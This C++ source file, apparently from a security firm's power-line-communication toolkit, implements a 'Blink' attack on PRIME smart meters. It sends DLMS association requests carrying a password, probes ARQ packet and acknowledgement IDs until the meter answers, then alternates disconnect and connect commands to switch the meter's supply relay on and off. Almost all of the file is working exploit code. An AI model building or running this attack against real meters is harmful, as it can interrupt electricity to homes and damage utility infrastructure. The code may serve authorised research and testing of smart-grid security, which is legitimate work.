//
// Copyright (c) 2020, Tarlogic Security SL
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright notice,
//    this list of conditions and the following disclaimer in the documentation
//    and/or other materials provided with the distribution.
// 3. Neither the name of copyright holders nor the names of its contributors
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS”
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//

#include "BlinkAttack.h"

#include <PRIME/PrimeAdapter.h>
#include <PRIME/PrimeFrame.h>
#include <Topology/Concentrator.h>
#include <Topology/Meter.h>
#include <ber/ber.h>
#include <ber/stream.h>
#include <gurux/include/GXBytebuffer.h>
#include <gurux/include/GXDLMSClient.h>
#include <gurux/include/enums.h>
#include <util/defs.h>

#include <QDateTime>
#include <QObject>
#include <QTimer>
#include <cmath>
#include <string>
#include <vector>

#include "util/defs.h"

using namespace PLCTool;

BlinkAttack::BlinkAttack(
    QObject *parent,
    QString const attackName,
    StringParams const &params,
    PrimeAdapter *adapter)
    : Attack(parent, attackName, adapter)
{
  std::string snaString = params["sna"].asString();
  this->sna = std::vector<uint8_t>(snaString.begin(), snaString.end());
  this->nid = params["nid"].asULong();
  this->lcid = params["lcid"].asULong();
  this->level = params["level"].asInt();
  this->authenticationLevel =
      (DLMS_AUTHENTICATION) params["authenticationLevel"].asInt();
  this->password = params["password"].asString();

  this->msTimeout = params["msTimeout"].asInt();
  this->timeoutTimer = new QTimer(this);
  this->timeoutTimer->setSingleShot(true);

  this->messageTimer = new QTimer(this);

  this->cancelled = false;

  this->frame = new PrimeFrame(this->sna.data());
  this->composeAARQ();

  this->connectAll();
  this->state = IDLE;
}

BlinkAttack::BlinkAttack(
    QString const attackName,
    StringParams const &params,
    PrimeAdapter *adapter)
    : BlinkAttack(nullptr, attackName, params, adapter)
{
}

void
BlinkAttack::connectAll(void)
{
  connect(
      this->timeoutTimer,
      SIGNAL(timeout(void)),
      this,
      SLOT(onTimeout(void)));
  connect(
      this->messageTimer,
      SIGNAL(timeout(void)),
      this,
      SLOT(onMessageTime(void)));

  connect(
      this->adapter,
      SIGNAL(frameReceived(
          PLCTool::Concentrator *,
          QDateTime,
          bool,
          const void *,
          size_t)),
      this,
      SLOT(onFrameReceived(
          PLCTool::Concentrator *,
          QDateTime,
          bool,
          const void *,
          size_t)),
      Qt::BlockingQueuedConnection);

  connect(
      this->adapter,
      SIGNAL(dataReceived(
          PLCTool::Meter *,
          QDateTime,
          bool,
          const void *,
          size_t)),
      this,
      SLOT(onDataReceived(
          PLCTool::Meter *,
          QDateTime,
          bool,
          const void *,
          size_t)),
      Qt::BlockingQueuedConnection);
}

void
BlinkAttack::updateProgress()
{
  if (this->state == IDLE)
    emit attackProgress(0);
  else if (this->state == SEQUENCING)
    emit attackProgress(0.5);
  else if (this->state == DISCONNECTING)
    emit attackProgress(1.0);
  else if (this->state == CONNECTING)
    emit attackProgress(1.0);
}

void
BlinkAttack::composeAARQ(void)
{
  std::vector<unsigned char> firstPart;
  std::vector<unsigned char> passwordVector;
  std::vector<unsigned char> lastPart;
  std::vector<unsigned char> data;

  this->frame->PDU.macType = PrimeFrame::GENERIC;
  this->frame->PDU.genType = PrimeFrame::DATA;

  this->frame->PDU.HDR.HT = 0x0;
  this->frame->PDU.HDR.DO = 0x1;
  this->frame->PDU.HDR.LEVEL = this->level;
  this->frame->PDU.HDR.HCS = 0x39;

  this->frame->PDU.PKT.PRIO = 0x2;
  this->frame->PDU.PKT.NAD = 0x1;
  this->frame->PDU.PKT.LEN = 0;
  this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
  this->frame->PDU.PKT.SID = this->nid >> 14;
  this->frame->PDU.PKT.LCID_CTYPE = this->lcid;

  this->frame->PDU.ARQ.PKTID = this->pktId;
  this->frame->PDU.ARQ.WINSIZE = 0x10;
  this->frame->PDU.ARQ.ACKID = this->ackId;
  this->frame->PDU.ARQ.NACKID.resize(0);
  this->frame->PDU.SAR.TYPE = PrimeFrame::FIRST;
  this->frame->PDU.SAR.NSEGS = 0x0;

  firstPart = hexStrToVector(
      "6036a1090607608574050801018a0207"
      "808b0760857405080201ac0a8008");
  passwordVector =
      std::vector<unsigned char>(this->password.begin(), this->password.end());
  lastPart = hexStrToVector(
      "be10040e01000000065f1f0400005c1f"
      "0122");
  data.reserve(firstPart.size() + passwordVector.size() + lastPart.size());
  data.insert(data.end(), firstPart.begin(), firstPart.end());
  data.insert(data.end(), passwordVector.begin(), passwordVector.end());
  data.insert(data.end(), lastPart.begin(), lastPart.end());

  this->frame->PDU.DATA = data;

  this->frame->PDU.CL.TYPE = 0x90;
  this->frame->PDU.CL.SRC = 1;
  this->frame->PDU.CL.DEST = 1;
}

void
BlinkAttack::composeDisconnect(void)
{
  this->frame->PDU.macType = PrimeFrame::GENERIC;
  this->frame->PDU.genType = PrimeFrame::DATA;

  this->frame->PDU.HDR.HT = 0x0;
  this->frame->PDU.HDR.DO = 0x1;
  this->frame->PDU.HDR.LEVEL = this->level;
  this->frame->PDU.HDR.HCS = 0x39;

  this->frame->PDU.PKT.PRIO = 0x2;
  this->frame->PDU.PKT.NAD = 0x1;
  this->frame->PDU.PKT.LEN = 0;
  this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
  this->frame->PDU.PKT.SID = this->nid >> 14;
  this->frame->PDU.PKT.LCID_CTYPE = this->lcid;

  this->frame->PDU.ARQ.PKTID = this->pktId;
  this->frame->PDU.ARQ.WINSIZE = 0x10;
  this->frame->PDU.ARQ.ACKID = this->ackId;
  this->frame->PDU.ARQ.NACKID.resize(0);
  this->frame->PDU.SAR.TYPE = PrimeFrame::FIRST;
  this->frame->PDU.SAR.NSEGS = 0x0;

  this->frame->PDU.DATA = hexStrToVector("c301c10046000060030aff01010f00");

  this->frame->PDU.CL.TYPE = 0x90;
  this->frame->PDU.CL.SRC = 1;
  this->frame->PDU.CL.DEST = 1;
}

void
BlinkAttack::composeConnect(void)
{
  this->frame->PDU.macType = PrimeFrame::GENERIC;
  this->frame->PDU.genType = PrimeFrame::DATA;

  this->frame->PDU.HDR.HT = 0x0;
  this->frame->PDU.HDR.DO = 0x1;
  this->frame->PDU.HDR.LEVEL = this->level;
  this->frame->PDU.HDR.HCS = 0x39;

  this->frame->PDU.PKT.PRIO = 0x2;
  this->frame->PDU.PKT.NAD = 0x1;
  this->frame->PDU.PKT.LEN = 0;
  this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
  this->frame->PDU.PKT.SID = this->nid >> 14;
  this->frame->PDU.PKT.LCID_CTYPE = this->lcid;

  this->frame->PDU.ARQ.PKTID = this->pktId;
  this->frame->PDU.ARQ.WINSIZE = 0x10;
  this->frame->PDU.ARQ.ACKID = this->ackId;
  this->frame->PDU.ARQ.NACKID.resize(0);
  this->frame->PDU.SAR.TYPE = PrimeFrame::FIRST;
  this->frame->PDU.SAR.NSEGS = 0x0;

  this->frame->PDU.DATA = hexStrToVector("c301c10046000060030aff02010f00");

  this->frame->PDU.CL.TYPE = 0x90;
  this->frame->PDU.CL.SRC = 1;
  this->frame->PDU.CL.DEST = 1;
}

void
BlinkAttack::composeRelease(void)
{
  this->frame->PDU.macType = PrimeFrame::GENERIC;
  this->frame->PDU.genType = PrimeFrame::DATA;

  this->frame->PDU.HDR.HT = 0x0;
  this->frame->PDU.HDR.DO = 0x1;
  this->frame->PDU.HDR.LEVEL = this->level;
  this->frame->PDU.HDR.HCS = 0x39;

  this->frame->PDU.PKT.PRIO = 0x2;
  this->frame->PDU.PKT.NAD = 0x1;
  this->frame->PDU.PKT.LEN = 0;
  this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
  this->frame->PDU.PKT.SID = this->nid >> 14;
  this->frame->PDU.PKT.LCID_CTYPE = this->lcid;

  this->frame->PDU.ARQ.PKTID = this->pktId;
  this->frame->PDU.ARQ.WINSIZE = 0x10;
  this->frame->PDU.ARQ.ACKID = this->ackId;
  this->frame->PDU.ARQ.NACKID.resize(0);
  this->frame->PDU.SAR.TYPE = PrimeFrame::FIRST;
  this->frame->PDU.SAR.NSEGS = 0x0;

  this->frame->PDU.DATA = hexStrToVector("6203800100");

  this->frame->PDU.CL.TYPE = 0x90;
  this->frame->PDU.CL.SRC = 1;
  this->frame->PDU.CL.DEST = 1;
}

void
BlinkAttack::idToSna(NodeId id, uint8_t *sna)
{
  unsigned int i;

  for (i = 0; i < 6; ++i) sna[i] = (uint8_t) (id >> (5 - i) * 8);
}

bool
BlinkAttack::sequencingFound(void)
{
  return this->state == DISCONNECTING;
}

bool
BlinkAttack::isPacketExpected(unsigned char pktid)
{
  return this->frame->PDU.ARQ.ACKID == pktid;
}

void
BlinkAttack::transitionTo(State next)
{
  switch (next) {
    case RELEASING:
      this->composeRelease();
      break;
    case SEQUENCING:
      this->composeAARQ();
      break;
    case CONNECTING:
      this->composeConnect();
      break;
    case DISCONNECTING:
      this->composeDisconnect();
      break;
    default:
      this->messageTimer->stop();
      if (this->cancelled)
        emit this->attackCancelled();
      break;
  }

  this->state = next;
}

//////////////////////////////////// Slots /////////////////////////////////////

void
BlinkAttack::onTimeout(void)
{
  this->adapter->setLcd(0, "Timeout");
  this->adapter->setLcd(1, "reached");
  this->messageTimer->stop();

  emit attackTimeout();
}

void
BlinkAttack::onMessageTime(void)
{
  QString status;
  switch (this->state) {
    case SEQUENCING:
      status =
          QString("AARQ probe with PKTID=%1 and ACKID=%2...")
              .arg(QString::number(this->pktId), QString::number(this->ackId));

      emit this->attackStatus(status);

      this->adapter->writeFrame(this->frame->serialize());

      pktId = (pktId + 1) % 0x3f;
      ackId = (ackId + 1) % 0x3f;

      break;

    case DISCONNECTING:
      status =
          QString("AARE found with PKTID=%1 and ACKID=%2... Disconnecting..")
              .arg(QString::number(this->pktId), QString::number(this->ackId));

      emit this->attackStatus(status);

      this->adapter->writeFrame(this->frame->serialize());

      break;

    case CONNECTING:
      status =
          QString("AARE found with PKTID=%1 and ACKID=%2... Connecting..")
              .arg(QString::number(this->pktId), QString::number(this->ackId));

      emit this->attackStatus(status);

      this->adapter->writeFrame(this->frame->serialize());

      break;

    case RELEASING:
      status = QString("Releasing meter..");

      emit this->attackStatus(status);

      this->adapter->writeFrame(this->frame->serialize());
      this->transitionTo(IDLE);

      break;

    default:
      this->messageTimer->stop();
      break;
  }
}

void
BlinkAttack::onFrameReceived(
    PLCTool::Concentrator *concentrator,
    QDateTime,
    bool downlink,
    const void *data,
    size_t size)
{
  uint8_t sna[6];
  this->idToSna(concentrator->id(), sna);
  PrimeFrame *frame =
      PrimeFrame::fromRawData(sna, static_cast<const uint8_t *>(data), size);

  if (frame != nullptr && frame->PDU.macType == PrimeFrame::GENERIC &&
      frame->PDU.genType == PrimeFrame::DATA) {
    // DATA packet! Check whether it was directed to us
    bool forMe = true;

#define SAME(x) frame->PDU.x == this->frame->PDU.x
    forMe = forMe && memcmp(frame->sna, this->frame->sna, 6) == 0;
    forMe = forMe && !frame->PDU.HDR.DO;  // Has to be uplink (from Meter)
    forMe = forMe && SAME(PKT.LCID_CTYPE);
    forMe = forMe && SAME(PKT.SID);
    forMe = forMe && SAME(PKT.LNID);
#undef SAME
    std::vector<uint8_t> rejection = hexStrToVector(
        "6129a109060760857405080101a203020101a305a10302010dbe10040e0800065f1f04"
        "00001c1d00800007");

    if (forMe) {
      if (this->sequencingFound() &&
          !this->isPacketExpected(frame->PDU.ARQ.PKTID))
        goto done;

      this->pktId = frame->PDU.ARQ.NACKID.size() > 0
                        ? static_cast<uint8_t>(frame->PDU.ARQ.NACKID[0])
                        : frame->PDU.ARQ.ACKID;
      this->ackId = frame->PDU.ARQ.PKTID + 1;

      switch (this->state) {
        case SEQUENCING:
          if (frame->PDU.DATA[0] == 0x0e ||
              frame->PDU.DATA[0] == 0xd8)  // Error
            this->transitionTo(RELEASING);
          else if (frame->PDU.DATA[0] == 0x61 && frame->PDU.DATA != rejection)
            this->transitionTo(DISCONNECTING);

          break;

        case DISCONNECTING:
          if (frame->PDU.DATA[0] == 0x0e ||
              frame->PDU.DATA[0] == 0xd8)  // Error
            this->transitionTo(RELEASING);
          else if (frame->PDU.DATA[0] == 0xc7)
            this->transitionTo(CONNECTING);

          break;

        case CONNECTING:
          if (frame->PDU.DATA[0] == 0x0e ||
              frame->PDU.DATA[0] == 0xd8)  // Error
            this->transitionTo(RELEASING);
          else if (frame->PDU.DATA[0] == 0xc7)
            this->transitionTo(DISCONNECTING);

          break;

        default:
          break;
      }

      this->timeoutTimer->stop();
    }
  }

done:
  if (frame)
    delete frame;
}

void
BlinkAttack::onDataReceived(
    PLCTool::Meter *meter,
    QDateTime timeStamp,
    bool downlink,
    const void *data,
    size_t size)
{
}


void
BlinkAttack::onStart(void)
{
  this->state = SEQUENCING;
  this->updateProgress();

  this->pktId = 0;
  this->ackId = 0;

  this->timeoutTimer->start(this->msTimeout);
  this->messageTimer->start(this->msMessageWait);

  this->adapter->setLcd(0, "Sending AARQ");
  this->adapter->setLcd(1, "probes");

  emit attackStarted();
}

void
BlinkAttack::onCancel(void)
{
  this->timeoutTimer->stop();
  this->transitionTo(RELEASING);

  this->adapter->setLcd(0, "Attack");
  this->adapter->setLcd(1, "cancelled");

  this->cancelled = true;
}

void
BlinkAttack::onEnd(void)
{
  this->timeoutTimer->stop();
  this->messageTimer->stop();

  emit attackEnd();
}
